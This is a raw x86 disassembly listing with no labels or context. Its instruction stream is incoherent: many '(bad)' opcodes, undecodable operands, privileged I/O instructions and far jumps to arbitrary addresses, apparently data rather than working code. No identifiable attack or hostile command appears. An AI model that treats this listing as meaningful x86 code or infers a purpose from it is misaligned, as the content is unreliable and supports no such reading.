  420a0c:	dec    DWORD PTR [ebp-0x465173df]
  420a12:	repz or eax,0x2932ef5e
  420a18:	sahf   
  420a19:	int    0x8f
  420a1b:	jmp    0x72ad69c4
  420a20:	ins    BYTE PTR es:[edi],dx
  420a21:	jmp    0x420a52
  420a23:	adc    DWORD PTR [ebx-0x53],0xfe5bb9e1
  420a2a:	jae    0x4209ca
  420a2c:	push   es
  420a2d:	xlat   BYTE PTR ds:[ebx]
  420a2e:	int3   
  420a2f:	outs   dx,BYTE PTR ds:[esi]
  420a30:	test   BYTE PTR [eax-0x20],al
  420a33:	(bad)  
  420a34:	enter  0xf460,0x3d
  420a38:	js     0x420a20
  420a3a:	pslld  mm7,QWORD PTR [edx+0x655beee1]
  420a41:	inc    esp
  420a42:	pop    esp
  420a43:	retf   0x16e3
  420a46:	shl    BYTE PTR [eax-0x3d77b000],1
  420a4c:	sbb    cl,ah
  420a4e:	push   eax
  420a4f:	cld    
  420a50:	fs and bh,bh
  420a53:	cmp    al,0xe9
  420a55:	loopne 0x420a62
  420a57:	xchg   esp,eax
  420a58:	xchg   esi,eax
  420a59:	inc    edx
  420a5a:	cdq    
  420a5b:	mov    ds:0x865e29b5,eax
  420a60:	adc    BYTE PTR [ebx],dh
  420a62:	scas   al,BYTE PTR es:[edi]
  420a63:	in     eax,0x72
  420a65:	test   dh,ch
  420a67:	outs   dx,DWORD PTR ds:[esi]
  420a68:	dec    ebx
  420a69:	dec    eax
  420a6a:	xchg   esi,eax
  420a6b:	fld    QWORD PTR [ebx+0x3a]
  420a6e:	sbb    al,0x9f
  420a70:	sub    al,0x46
  420a72:	popf   
  420a73:	fcom   QWORD PTR [ecx+eiz*4+0x30]
  420a77:	adc    ecx,DWORD PTR [eax]
  420a79:	jno    0x420a66
  420a7b:	in     eax,0x5d
  420a7d:	sbb    esp,DWORD PTR [edi+0x4d]
  420a80:	inc    esp
  420a81:	push   ebx
  420a82:	fs jo  0x420a23
  420a85:	or     al,0x5e
  420a87:	mov    eax,ds:0x3522b8e6
  420a8c:	and    DWORD PTR [eax-0x22],eax
  420a8f:	pop    ss
  420a90:	pop    esi
  420a91:	(bad)  
  420a92:	adc    bh,dh
  420a94:	mov    ebp,0x77f3d659
  420a99:	test   BYTE PTR gs:[esi-0x22],dh
  420a9d:	repnz or ecx,eax
  420aa0:	push   esi
  420aa1:	int    0x7c
  420aa3:	stos   DWORD PTR es:[edi],eax
  420aa4:	push   ss
  420aa5:	jbe    0x420a35
  420aa7:	mov    ds:0xaf2d6229,al
  420aac:	pop    eax
  420aad:	aaa    
  420aae:	int    0xaf
  420ab0:	mov    ?,WORD PTR [ecx+0x486a13a]
  420ab6:	(bad)  
  420ab7:	adc    bh,cl
  420ab9:	xor    bh,bh
  420abb:	fistp  DWORD PTR [esi-0x16]
  420abe:	clc    
  420abf:	adc    eax,0x72a36f22
  420ac4:	pop    edi
  420ac5:	popa   
  420ac6:	sbb    edi,ecx
  420ac8:	or     eax,0xb3a4c67b
  420acd:	into   
  420ace:	out    dx,al
  420acf:	jmp    0x7e94fa58
  420ad4:	adc    al,BYTE PTR [edi]
  420ad6:	xor    al,0xa1
  420ad8:	jle    0x420af8
  420ada:	pusha  
  420adb:	les    edi,FWORD PTR [ecx+0x5e89d754]
  420ae1:	dec    esi
  420ae2:	cmp    dh,BYTE PTR ds:0x414f0a24
  420ae8:	fwait
  420ae9:	mov    esi,0x5dfda0c1
  420aee:	add    al,0xb7
  420af0:	daa    
  420af1:	mov    ds:0xf35ec0c9,eax
  420af6:	or     cl,0x67
  420af9:	outs   dx,DWORD PTR ds:[esi]
  420afa:	aaa    
  420afb:	or     al,0xb
  420afd:	pop    esi
  420afe:	push   ebx
  420aff:	xchg   ebx,eax
  420b00:	ja     0x420a91
  420b02:	ficomp DWORD PTR [esi-0x6a]
  420b05:	enter  0x81bf,0x5d
  420b09:	mov    bl,0xd4
  420b0b:	test   eax,0x6a39f912
  420b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b11:	pop    ds
  420b12:	in     al,0xa0
  420b14:	xor    ebx,0x30
  420b17:	push   eax
  420b18:	jmp    0x134e:0x605ac98f
  420b1f:	add    edi,DWORD PTR [edx+0x4be19fab]
  420b25:	sbb    edi,DWORD PTR [esi-0x68]
  420b28:	cmp    al,0xc5
  420b2a:	xchg   esp,eax
  420b2b:	jl     0x420b81
  420b2d:	mov    esi,0x1378eaf
  420b32:	fcom   QWORD PTR [ebx+0x21]
  420b35:	cwde   
  420b36:	loopne 0x420adf
  420b38:	dec    esi
  420b39:	nop
  420b3a:	push   esp
  420b3b:	cmp    al,0x12
  420b3d:	shl    ebx,0x1e
  420b40:	adc    DWORD PTR ds:0xe0c0071f,edi
  420b46:	popa   
  420b47:	adc    eax,DWORD PTR [edx+0x46]
  420b4a:	xchg   esp,eax
  420b4b:	mov    dh,0x6a
  420b4d:	pusha  
  420b4e:	push   0x58368c24
  420b53:	add    al,0xb5
  420b55:	fsubr  st(7),st
  420b57:	jnp    0x420ae9
  420b59:	imul   edx,DWORD PTR [esi+0x52],0x4910014e
  420b60:	adc    esp,DWORD PTR [ecx+0x2]
  420b63:	xor    BYTE PTR [ecx-0x49],0xed
  420b67:	pop    edi
  420b68:	aas    
  420b69:	fiadd  DWORD PTR [edx]
  420b6b:	repnz push ss
  420b6d:	adc    eax,0xf85871ae
  420b72:	ja     0x420bb0
  420b74:	push   0xa7921d53
  420b79:	out    0x8e,eax
  420b7b:	and    DWORD PTR [ecx+edi*4-0x30],ebp
  420b7f:	call   FWORD PTR [ebp+0x2e]
  420b82:	push   ebx
  420b83:	adc    al,0xcc
  420b85:	add    dl,dh
  420b87:	int3   
  420b88:	xchg   esi,eax
  420b89:	or     al,0x55
  420b8b:	mov    eax,ds:0x27212883
  420b90:	call   DWORD PTR [esi]
  420b92:	mov    WORD PTR [edi+0x63d94a59],fs
  420b98:	sbb    BYTE PTR [esi+0x6b],cl
  420b9b:	mov    dl,0xd
  420b9d:	xchg   ecx,eax
  420b9e:	test   BYTE PTR [ebp-0x24fea242],dl
  420ba4:	sub    DWORD PTR [edx-0x6471f365],esi
  420baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bab:	arpl   WORD PTR [esi-0x3],bx
  420bae:	jno    0x420bf2
  420bb0:	call   0x7660:0x75a4802a
  420bb7:	or     esi,DWORD PTR [eax+0x414da2b]
  420bbd:	pop    ss
  420bbe:	out    0x4d,al
  420bc0:	pop    ebp
  420bc1:	push   es
  420bc2:	xchg   edi,eax
  420bc3:	loope  0x420b94
  420bc5:	iret   
  420bc6:	push   esp
  420bc7:	sbb    eax,0xa14beb9e
  420bcc:	(bad)  
  420bcd:	sbb    DWORD PTR [ecx],eax
  420bcf:	ret    
  420bd0:	mov    ds:0x5eafd77f,al
  420bd5:	cdq    
  420bd6:	(bad)  
  420bd7:	cmp    ebx,ebp
  420bd9:	fisttp QWORD PTR [esi+ecx*8+0x23665970]
  420be0:	add    BYTE PTR ds:0x3483f146,bh
  420be6:	int    0x92
  420be8:	push   ecx
  420be9:	inc    ebp
  420bea:	mov    DWORD PTR [ebp-0x127bada2],esi
  420bf0:	call   0x51e3b1d4
  420bf5:	add    eax,0x2b36e559
  420bfa:	mov    ah,0xff
  420bfc:	cmp    BYTE PTR ds:0x8cff2135,cl
  420c02:	aad    0x27
  420c04:	rol    bl,cl
  420c06:	call   0x2157:0x9fb0bca1
  420c0d:	mov    DWORD PTR ds:0x23ce5e67,ebp
  420c13:	ror    BYTE PTR [esi+0x33],0x61
  420c17:	push   es
  420c18:	icebp  
  420c19:	pusha  
  420c1a:	lock outs dx,DWORD PTR ds:[esi]
  420c1c:	in     eax,0x8e
  420c1e:	and    BYTE PTR [edi-0x1f],al
  420c21:	in     al,0xe7
  420c23:	dec    ecx
  420c24:	mov    ds:0xeed96dbc,al
  420c29:	(bad)  
  420c2a:	jmp    0x246e5662
  420c2f:	mov    eax,ds:0xaef5da62
  420c34:	inc    ebp
  420c35:	dec    eax
  420c36:	imul   eax,DWORD PTR [esi+0x37],0x1ea15a60
  420c3d:	push   dx
  420c3f:	xchg   esp,eax
  420c40:	mov    al,ds:0x6ba0d6c7
  420c45:	lods   eax,DWORD PTR ds:[esi]
  420c46:	jae    0x420bdf
  420c48:	cs clc 
  420c4a:	shr    BYTE PTR [ecx],cl
  420c4c:	pop    esp
  420c4d:	fisub  DWORD PTR [ebx-0x4d]
  420c50:	xchg   ebp,eax
  420c51:	jecxz  0x420c57
  420c53:	mov    eax,ds:0x180bf41d
  420c58:	arpl   bx,si
  420c5a:	imul   ebx,DWORD PTR [ebx+0x5e],0xfc945a63
  420c61:	xchg   ebx,eax
  420c62:	mul    BYTE PTR [edx-0x23]
  420c65:	pop    edi
  420c66:	or     bh,cl
  420c68:	push   cs
  420c69:	test   BYTE PTR [esi-0x5a],0x8b
  420c6d:	mov    ah,0x59
  420c6f:	push   edi
  420c70:	pop    esi
  420c71:	cs dec ebp
  420c73:	inc    edx
  420c74:	ss inc esi
  420c76:	loope  0x420c6f
  420c78:	or     dl,BYTE PTR [edx-0x74]
  420c7b:	shl    ch,1
  420c7d:	inc    esi
  420c7e:	out    dx,al
  420c7f:	les    esp,FWORD PTR [esi-0x4d]
  420c82:	std    
  420c83:	scas   eax,DWORD PTR es:[edi]
  420c84:	pop    esi
  420c85:	ror    BYTE PTR ds:0x1e4452c8,1
  420c8b:	mov    dl,BYTE PTR [eax+ebp*2+0x3fd13ac9]
  420c92:	mov    dl,0x60
  420c94:	call   0xdd0d977b
  420c99:	ud0    edx,DWORD PTR [esi+0x21a38983]
  420ca0:	ret    
  420ca1:	js     0x420c98
  420ca3:	push   es
  420ca4:	out    dx,eax
  420ca5:	aam    0x26
  420ca7:	mov    eax,ds:0x3a9d3f9b
  420cac:	idiv   BYTE PTR [edi-0xd]
  420caf:	stos   BYTE PTR es:[edi],al
  420cb0:	pop    esi
  420cb1:	out    0xf2,eax
  420cb3:	mov    eax,ds:0xd6801a51
  420cb8:	lock inc ecx
  420cba:	dec    ecx
  420cbb:	(bad)  
  420cbc:	int3   
  420cbd:	fst    QWORD PTR [ebx+0x5f0eee34]
  420cc3:	push   ecx
  420cc4:	fcomp  st(7)
  420cc6:	addr16 inc eax
  420cc8:	pop    esi
  420cc9:	(bad)  
  420cca:	fbstp  TBYTE PTR [ebx+edi*2]
  420ccd:	jp     0x420ca3
  420ccf:	ror    BYTE PTR [ecx+0x5e],1
  420cd2:	sub    dh,dh
  420cd4:	mov    edx,0xcef77219
  420cd9:	cli    
  420cda:	adc    esi,esp
  420cdc:	pop    esi
  420cdd:	mov    bh,0xa3
  420cdf:	mov    ebx,0x39f65e58
  420ce4:	sahf   
  420ce5:	pop    esi
  420ce6:	ds nop
  420ce8:	cmp    eax,0xfd129bab
  420ced:	jnp    0x420c71
  420cef:	dec    esi
  420cf0:	test   BYTE PTR [esi-0x644280b2],bh
  420cf6:	out    dx,al
  420cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cf8:	(bad)  
  420cfa:	add    ecx,edx
  420cfc:	xchg   BYTE PTR [eax],bl
  420cfe:	clc    
  420cff:	mov    al,ds:0x1471a709
  420d04:	inc    ebp
  420d05:	dec    esi
  420d06:	imul   eax,DWORD PTR [ecx+0x5e],0xe1b9247
  420d0d:	fdiv   DWORD PTR [eax+ebp*1+0x2c066963]
  420d14:	pop    ebp
  420d15:	aaa    
  420d16:	or     BYTE PTR [ebx-0x451c7ba4],bl
  420d1c:	outs   dx,BYTE PTR ds:[esi]
  420d1d:	je     0x420d44
  420d1f:	mov    eax,ds:0xff276007
  420d24:	jbe    0x420d8e
  420d26:	mov    BYTE PTR [edi+0x5e],0x52
  420d2a:	fwait
  420d2b:	popa   
  420d2c:	adc    ebx,ebp
  420d2e:	test   DWORD PTR [ebp-0x30],eax
  420d31:	inc    ebx
  420d32:	les    edi,FWORD PTR [ebx-0x608decb]
  420d38:	sub    eax,0x5e333128
  420d3d:	inc    ebp
  420d3e:	bound  edx,QWORD PTR [ecx+0x73]
  420d41:	xchg   esp,eax
  420d42:	cmp    eax,0xff609cd0
  420d47:	aad    0x74
  420d49:	add    eax,0x18fe324a
  420d4e:	cli    
  420d4f:	into   
  420d50:	cdq    
  420d51:	xchg   edx,eax
  420d52:	sub    eax,0xad0086a1
  420d57:	cwde   
  420d58:	cld    
  420d59:	das    
  420d5a:	inc    ecx
  420d5b:	mov    ds:0xaa405288,al
  420d60:	add    al,0xde
  420d62:	dec    esp
  420d63:	jge    0x420db0
  420d65:	imul   dh
  420d67:	(bad)  
  420d69:	cld    
  420d6a:	or     BYTE PTR [eax+0x10],0x26
  420d6e:	fldenv [eax-0x3ac8b45b]
  420d74:	mov    edi,0x60ee983b
  420d79:	out    0xb0,eax
  420d7b:	xor    BYTE PTR [edi],0x4e
  420d7e:	loopne 0x420d60
  420d80:	lea    edx,[edx-0xe]
  420d83:	mov    al,ds:0x1d025775
  420d88:	inc    ebx
  420d89:	ret    
  420d8a:	xor    DWORD PTR [ebp+0x5e],0xffffffc7
  420d8e:	retf   
  420d8f:	test   DWORD PTR [edi-0x78],esp
  420d92:	xor    eax,DWORD PTR [edx-0x5e990ed1]
  420d98:	imul   edx,DWORD PTR [edi],0xffffff9e
  420d9b:	cmc    
  420d9c:	sbb    edx,esp
  420d9e:	push   esi
  420d9f:	ficomp WORD PTR [ebp-0x71]
  420da2:	pop    ds
  420da3:	xchg   edi,eax
  420da4:	pop    ds
  420da5:	cld    
  420da6:	jae    0x420d94
  420da8:	push   ds
  420da9:	test   ah,bh
  420dab:	ficomp WORD PTR cs:[ebx-0x45]
  420daf:	jb     0x420d73
  420db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420db2:	int3   
  420db3:	pusha  
  420db4:	js     0x420de6
  420db6:	lock ficomp DWORD PTR [esi-0x3a]
  420dba:	daa    
  420dbb:	ret    0x4f07
  420dbe:	test   al,0x87
  420dc0:	icebp  
  420dc1:	pop    edi
  420dc2:	and    DWORD PTR [esi-0x44],0xddcf2bf7
  420dc9:	xchg   esp,eax
  420dca:	xor    ch,dl
  420dcc:	pop    esi
  420dcd:	jg     0x420ded
  420dcf:	mov    ds:0x26986a05,al
  420dd4:	and    al,0x61
  420dd6:	inc    ebx
  420dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dd8:	iret   
  420dd9:	push   ebp
  420dda:	mov    dl,0xc
  420ddc:	jb     0x420dd5
  420dde:	out    dx,al
  420ddf:	inc    edx
  420de0:	loopne 0x420e2c
  420de2:	and    DWORD PTR [esi],edx
  420de4:	cld    
  420de5:	pop    ecx
  420de6:	adc    esp,DWORD PTR [ecx-0x2e7c97b3]
  420dec:	push   edi
  420ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dee:	retf   
  420def:	mov    BYTE PTR [edi+0x7b],bl
  420df2:	jmp    0x8219:0xf3309364
  420df9:	call   0x610edadc
  420dfe:	push   eax
  420dff:	loopne 0x420d86
  420e01:	ror    DWORD PTR [esi+0x12cf50bf],1
  420e07:	mov    ss,WORD PTR [edx+0x18]
  420e0a:	and    BYTE PTR [ecx+0x469ba2ca],ah
  420e10:	sbb    edi,DWORD PTR [eax+0x59]
  420e13:	imul   ebx,DWORD PTR [ecx+eiz*2+0x19],0x77
  420e18:	in     al,0xe9
  420e1a:	test   al,0x35
  420e1c:	adc    ebx,DWORD PTR [edx-0x12]
  420e1f:	inc    esi
  420e20:	cmp    BYTE PTR [edx+ebx*1],ch
  420e23:	xchg   esp,eax
  420e24:	in     eax,dx
  420e25:	pop    ebx
  420e26:	mov    ebx,0xa76e3ba7
  420e2b:	mov    dl,0x56
  420e2d:	popa   
  420e2e:	neg    ecx
  420e30:	call   0xfb242fb7
  420e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e36:	out    dx,al
  420e37:	cs sub edx,0x25
  420e3b:	adc    DWORD PTR [ebx-0x23],0xffffffb1
  420e3f:	out    dx,eax
  420e40:	in     al,0x60
  420e42:	xlat   BYTE PTR ds:[ebx]
  420e43:	cmp    al,0x3b
  420e45:	(bad)  
  420e46:	sti    
  420e47:	push   edi
  420e48:	into   
  420e49:	xor    ch,dh
  420e4b:	bound  edi,QWORD PTR [edi-0x5d408e1]
  420e51:	push   ebp
  420e52:	jge    0x420ec3
  420e54:	aaa    
  420e55:	popa   
  420e56:	mov    BYTE PTR [edi],bl
  420e58:	(bad)  
  420e59:	repz rdtsc 
  420e5c:	lea    eax,[edx+0x35522eeb]
  420e62:	dec    ebx
  420e63:	jns    0x420ebd
  420e65:	cdq    
  420e66:	in     eax,0x5f
  420e68:	and    ebx,DWORD PTR [eax-0x24]
  420e6b:	shl    BYTE PTR [edx-0x2caf9108],1
  420e71:	jl     0x420eb0
  420e73:	outs   dx,BYTE PTR ds:[esi]
  420e74:	dec    esp
  420e75:	not    DWORD PTR [ebx-0x5435a1ff]
  420e7b:	fidiv  WORD PTR [eax+0x76a41186]
  420e81:	xchg   edi,eax
  420e82:	ds sub al,0xf5
  420e85:	ja     0x420e1d
  420e87:	and    BYTE PTR [edi+0x2b81ee9c],cl
  420e8d:	xor    al,0xc2
  420e8f:	leave  
  420e90:	mov    ah,0x1c
  420e92:	repnz sahf 
  420e94:	mov    DWORD PTR [eax],esi
  420e96:	sub    BYTE PTR [edi],cl
  420e98:	push   ds
  420e99:	cmp    BYTE PTR [edi-0x11d1531b],ah
  420e9f:	adc    bh,ah
  420ea1:	dec    ebp
  420ea2:	arpl   WORD PTR [eax],bx
  420ea4:	mov    BYTE PTR [ebp+ebp*2-0x2982565f],cl
  420eab:	pop    esi
  420eac:	f2xm1  
  420eae:	inc    edi
  420eaf:	cdq    
  420eb0:	pop    esi
  420eb1:	jecxz  0x420eab
  420eb3:	sub    BYTE PTR [ecx],bh
  420eb5:	jo     0x420e84
  420eb7:	dec    eax
  420eb8:	fist   WORD PTR [edx-0x6c]
  420ebb:	push   ds
  420ebc:	jno    0x420e71
  420ebe:	mov    ?,eax
  420ec0:	hlt    
  420ec1:	in     al,dx
  420ec2:	dec    ecx
  420ec3:	dec    esi
  420ec4:	pop    esi
  420ec5:	shl    DWORD PTR [ebp+0x5a],0x29
  420ec9:	mov    ds:0x60e99546,al
  420ece:	or     eax,0x4093ca40
  420ed3:	addr16 fs xchg ecx,eax
  420ed6:	out    dx,al
  420ed7:	jo     0x420f19
  420ed9:	rcl    DWORD PTR [eax],cl
  420edb:	cdq    
  420edc:	xchg   ebx,eax
  420edd:	cwde   
  420ede:	mov    esp,DWORD PTR [ecx-0x78b0311a]
  420ee4:	pop    ds
  420ee5:	adc    dh,0x7b
  420ee8:	pop    ebp
  420ee9:	out    dx,al
  420eea:	push   esi
  420eeb:	pusha  
  420eec:	scas   al,BYTE PTR es:[edi]
  420eed:	ds cli 
  420eef:	div    BYTE PTR [esi-0x33]
  420ef2:	push   eax
  420ef3:	jmp    0xa1a83563
  420ef8:	pop    ecx
  420ef9:	fisttp QWORD PTR [bx-0x37]
  420efd:	cs push 0xd9f05e6a
  420f03:	inc    edi
  420f04:	ret    
  420f05:	into   
  420f06:	pop    ebp
  420f07:	jbe    0x420ef3
  420f09:	adc    al,0x91
  420f0b:	in     eax,0x60
  420f0d:	mov    cl,BYTE PTR [edi]
  420f0f:	add    ah,BYTE PTR [ebp+0x26]
  420f12:	ins    DWORD PTR es:[edi],dx
  420f13:	outs   dx,BYTE PTR ds:[esi]
  420f14:	adc    eax,0xad6d126a
  420f19:	mov    bl,0x25
  420f1b:	dec    ecx
  420f1c:	mov    ecx,0x9559d2e0
  420f21:	fsub   st,st(1)
  420f23:	addr16 dec edi
  420f25:	push   ebx
  420f26:	xchg   ecx,eax
  420f27:	jns    0x420f6f
  420f29:	sub    dh,0xe7
  420f2c:	jecxz  0x420fa0
  420f2e:	mov    WORD PTR [ebx],?
  420f30:	pop    edi
  420f31:	mov    ?,WORD PTR [ebp+0x39ae60c7]
  420f37:	xor    DWORD PTR [edx],ebx
  420f39:	mov    BYTE PTR [ebx+0x41],dl
  420f3c:	imul   ecx,DWORD PTR [edi-0x31],0xffffffa0
  420f40:	fwait
  420f41:	sub    al,0xf6
  420f43:	int3   
  420f44:	test   DWORD PTR [edx+ecx*4+0x4ad5e7f],edx
  420f4b:	sbb    eax,0xe1efc25c
  420f50:	ins    DWORD PTR es:[edi],dx
  420f51:	js     0x420f1f
  420f53:	push   ss
  420f54:	lea    esp,[eax-0x22]
  420f57:	scas   eax,DWORD PTR es:[edi]
  420f58:	inc    eax
  420f59:	mov    bl,0xc8
  420f5b:	test   eax,0xdaeee97b
  420f60:	adc    eax,DWORD PTR ds:0xfa44ebb0
  420f66:	dec    eax
  420f67:	nop
  420f68:	mov    cl,BYTE PTR [edx+eiz*2]
  420f6b:	adc    al,0xb7
  420f6d:	pusha  
  420f6e:	pop    ss
  420f6f:	jp     0x420fbb
  420f71:	jmp    0x420f19
  420f73:	dec    ecx
  420f74:	pop    esi
  420f75:	mov    BYTE PTR [ebp+ecx*1-0x47e35f18],ch
  420f7c:	test   BYTE PTR [ecx-0x4],bl
  420f7f:	icebp  
  420f80:	scas   al,BYTE PTR es:[edi]
  420f81:	jmp    edx
  420f83:	mov    al,ds:0x7da7682c
  420f88:	pop    esi
  420f89:	cmp    al,0x69
  420f8b:	pop    esp
  420f8c:	pop    ebp
  420f8d:	loop   0x420fe4
  420f8f:	ret    
  420f90:	dec    ecx
  420f91:	popa   
  420f92:	xchg   ebp,eax
  420f93:	adc    ebx,DWORD PTR [eax+0x2c251594]
  420f99:	lods   al,BYTE PTR ds:[esi]
  420f9a:	out    dx,al
  420f9b:	sub    al,0x3c
  420f9d:	mov    dl,0xf
  420f9f:	and    BYTE PTR [esi+0x7b],dh
  420fa2:	loop   0x420f3b
  420fa4:	mov    esi,0x717d5115
  420fa9:	inc    ecx
  420faa:	fsubr  st(3),st
  420fac:	cdq    
  420fad:	jecxz  0x420f81
  420faf:	pop    ebx
  420fb0:	ficom  WORD PTR [edx+0x60db61d9]
  420fb6:	loop   0x42101d
  420fb8:	sub    ebx,DWORD PTR [eax+0x36]
  420fbb:	loop   0x420f66
  420fbd:	push   ss
  420fbe:	jmp    0x42102d
  420fc0:	ds addr16 fsubr st(2),st
  420fc4:	mov    bl,0x52
  420fc6:	bound  edx,QWORD PTR [esi+0x6d13ef66]
  420fcc:	(bad)  [esi-0x5221dbc3]
  420fd2:	inc    esi
  420fd3:	out    dx,al
  420fd4:	cmp    al,0xf7
  420fd6:	out    dx,al
  420fd7:	sub    edi,esi
  420fd9:	repnz rcr BYTE PTR [ebp+0x58],1
  420fdd:	call   0xe625:0x1734a0fd
  420fe4:	into   
  420fe5:	push   cs
  420fe6:	stos   DWORD PTR es:[edi],eax
  420fe7:	mov    cl,0x65
  420fe9:	pop    edi
  420fea:	ins    DWORD PTR es:[edi],dx
  420feb:	cmp    BYTE PTR [edi+0x60],ch
  420fee:	test   eax,0x24fcc4b4
  420ff3:	mov    eax,ds:0x9a6b822f
  420ff8:	sbb    eax,0xd6987efa
  420ffd:	int3   
  420ffe:	cli    
  420fff:	sub    eax,0xa14e3547
  421004:	lahf   
  421005:	add    al,0xce
  421007:	add    bh,BYTE PTR [ebp+0x3]
  42100a:	xchg   esp,eax
  42100b:	mov    al,0xdf
  42100d:	fldln2 
  42100f:	inc    edx
  421010:	ret    
  421011:	cld    
  421012:	jo     0x421062
  421014:	pop    eax
  421015:	mov    ecx,0x385dec0c
  42101a:	pop    es
  42101b:	push   ss
  42101c:	push   edi
  42101d:	or     eax,0x6a6a24d2
  421022:	addr16 int 0x26
  421025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421026:	out    dx,al
  421027:	jno    0x421019
  421029:	ret    
  42102a:	push   ss
  42102b:	xchg   ch,cl
  42102d:	jne    0x42101d
  42102f:	sbb    BYTE PTR [ecx],cl
  421031:	mov    ecx,0x2cb0bd5c
  421036:	retf   
  421037:	mov    al,ds:0x6acd741
  42103c:	outs   dx,DWORD PTR ds:[esi]
  42103d:	popf   
  42103e:	test   al,0x12
  421040:	pop    esi
  421041:	cmp    DWORD PTR [eax-0x5e377479],0x18
  421048:	adc    al,0x5e
  42104a:	sbb    ebx,DWORD PTR [edx]
  42104c:	push   ecx
  42104d:	das    
  42104e:	cmp    ah,BYTE PTR [ebx]
  421050:	(bad)  
  421051:	push   edx
  421052:	or     ch,ah
  421054:	jb     0x4210ab
  421056:	in     eax,dx
  421057:	mov    ?,WORD PTR [ebx-0x45]
  42105a:	sahf   
  42105b:	add    al,BYTE PTR [ebp+ecx*1+0x63c8662a]
  421062:	jae    0x420fe5
  421064:	pop    esi
  421065:	cs nop
  421067:	dec    edi
  421068:	(bad)  
  421069:	retf   
  42106a:	cld    
  42106b:	addr16 pop esi
  42106d:	jle    0x421054
  42106f:	push   0x486bfc28
  421074:	das    
  421075:	dec    ebx
  421076:	movsx  esi,BYTE PTR ds:0x989e7a61
  42107d:	mov    ebx,0x9a5066f9
  421082:	cmp    DWORD PTR [eax-0x29b9dca2],ebx
  421088:	xor    al,BYTE PTR [esi-0x20]
  42108b:	(bad)  
  42108c:	repz fsubr DWORD PTR [eax+ebp*4-0x6b]
  421091:	pushf  
  421092:	xchg   esi,eax
  421093:	shl    DWORD PTR ds:0x3c1bbf58,1
  421099:	push   cs
  42109a:	or     DWORD PTR [eax],esi
  42109c:	pop    ebp
  42109d:	lahf   
  42109e:	inc    esp
  42109f:	inc    edi
  4210a0:	mov    edi,0x7dfc62c1
  4210a5:	pusha  
  4210a6:	jmp    0x4210a9
  4210a8:	sub    ebp,eax
  4210aa:	cwde   
  4210ab:	adc    al,0xf
  4210ad:	cmp    al,BYTE PTR [edx]
  4210af:	call   DWORD PTR [edx]
  4210b1:	jbe    0x421123
  4210b3:	cmp    ch,BYTE PTR [eax+eax*8-0x4a]
  4210b7:	(bad)  
  4210b8:	xchg   ecx,eax
  4210b9:	push   DWORD PTR [ebx+0xf4c36a0]
  4210bf:	inc    eax
  4210c0:	dec    eax
  4210c1:	cmp    eax,0x755e01a6
  4210c6:	sub    DWORD PTR [ebx],esi
  4210c8:	out    dx,al
  4210c9:	dec    edi
  4210ca:	add    DWORD PTR [ebx-0x64b544f6],0x7cdf92de
  4210d4:	mov    DWORD PTR [eax+0x3e],esp
  4210d7:	dec    edi
  4210d8:	test   DWORD PTR [ebp-0x70a1d66f],0x8b1e67b9
  4210e2:	or     eax,0x5f5346ac
  4210e7:	cmp    ecx,ebp
  4210e9:	cli    
  4210ea:	cs iret 
  4210ec:	pushf  
  4210ed:	cmp    esi,eax
  4210ef:	or     bl,BYTE PTR [esi+0x0]
  4210f2:	xchg   esp,eax
  4210f3:	mov    ds:0x5c13b2f7,eax
  4210f8:	push   edx
  4210f9:	popa   
  4210fa:	mov    dh,0xbf
  4210fc:	hlt    
  4210fd:	out    0xb2,al
  4210ff:	xchg   dl,dl
  421101:	call   0x54d8:0x125e7e58
  421108:	ret    
  421109:	and    DWORD PTR [ebx+0x3f012143],0x3460e802
  421113:	push   edi
  421114:	int    0x1c
  421116:	stos   DWORD PTR es:[edi],eax
  421117:	loopne 0x4210dd
  421119:	test   dh,ch
  42111b:	add    al,BYTE PTR [edi+0x3223e41f]
  421121:	add    al,0xbe
  421123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421124:	mov    al,ds:0x407b4315
  421129:	fcom   QWORD PTR [esi+0x46657a21]
  42112f:	xchg   BYTE PTR [edx+0x29],bh
  421132:	out    dx,al
  421133:	and    al,BYTE PTR [esi*2-0x1c034599]
  42113a:	sahf   
  42113b:	mov    eax,ds:0x15104d2e
  421140:	push   ds
  421141:	pusha  
  421142:	fist   DWORD PTR [ebx-0xe]
  421145:	jmp    0x995c6238
  42114a:	(bad)  
  42114b:	test   BYTE PTR [esi-0x4e5e7b71],bh
  421151:	xchg   DWORD PTR [eax+0x140a04bc],ecx
  421157:	retf   
  421158:	pop    esi
  421159:	lahf   
  42115a:	nop
  42115b:	lods   al,BYTE PTR ds:[esi]
  42115c:	push   esp
  42115d:	les    ebx,FWORD PTR ds:0x7e615287
  421163:	cld    
  421164:	or     eax,0x9fdfd1c0
  421169:	jno    0x421159
  42116b:	mov    esp,0xfb4e775
  421170:	loop   0x4211db
  421172:	ds (bad) 
  421174:	call   0xc265:0x4a629f68
  42117b:	xchg   edx,eax
  42117c:	add    ebx,DWORD PTR [ecx-0x7fa19562]
  421182:	mov    bl,BYTE PTR [eax]
  421184:	repz clc 
  421186:	aad    0x91
  421188:	iret   
  421189:	pusha  
  42118a:	stos   BYTE PTR es:[edi],al
  42118b:	(bad)  
  42118c:	mov    bl,0xf3
  42118e:	sub    edx,DWORD PTR [ebp+0x12]
  421191:	adc    esi,ebp
  421193:	(bad)  
  421194:	jl     0x4211c6
  421196:	push   0xbdf27176
  42119b:	mov    al,ds:0xad434f6b
  4211a0:	push   eax
  4211a1:	or     eax,0x36eef946
  4211a6:	out    dx,al
  4211a7:	(bad)  
  4211a8:	pop    eax
  4211a9:	aas    
  4211aa:	imul   ecx,DWORD PTR [edi-0x583fbef2],0x28
  4211b1:	or     esp,esi
  4211b3:	cmp    DWORD PTR [ecx+eiz*8],ebx
  4211b6:	mov    dh,ch
  4211b8:	mov    WORD PTR [edi-0x2bad4510],gs
  4211be:	hlt    
  4211bf:	pusha  
  4211c0:	in     eax,0x9a
  4211c2:	sbb    BYTE PTR [ebp-0x54e39f7f],dh
  4211c8:	shl    al,1
  4211ca:	cmp    esi,DWORD PTR [ebp-0x65]
  4211cd:	sbb    BYTE PTR [eax],al
  4211cf:	mov    edx,0xec2ec7e4
